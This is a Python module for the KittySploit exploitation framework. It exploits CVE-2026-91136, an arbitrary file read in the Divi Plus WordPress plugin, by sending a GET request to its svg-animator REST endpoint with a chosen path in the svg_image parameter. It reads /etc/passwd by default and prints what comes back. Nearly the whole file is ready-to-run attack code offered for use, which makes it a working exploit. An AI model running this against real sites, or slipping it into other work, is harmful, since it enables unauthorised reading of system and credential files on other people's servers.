#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Divi Plus CVE-2026-91136 — svg_image LFI via REST."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Divi Plus CVE-2026-91136 file read",
        "description": "GET dipl-modules/svg-animator?svg_image= arbitrary read.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-91136"],
        "tags": ["wordpress", "divi-plus", "lfi", "cve-2026-91136"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    read_path = OptString("/etc/passwd", "Absolute path to read", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        target = (self.read_path or "/etc/passwd").strip()
        resp = self.http_request(
            method="GET",
            path=self._join("/wp-json/elicus/v1/dipl-modules/svg-animator"),
            params={"svg_image": target},
            allow_redirects=False,
        )
        body = resp.text or "" if resp else ""
        if resp and int(resp.status_code or 0) == 200 and body.strip():
            print_success(f"Read {target} ({len(body)} bytes)")
            print_status(body[:800])
            return True
        print_error("File read failed")
        return False
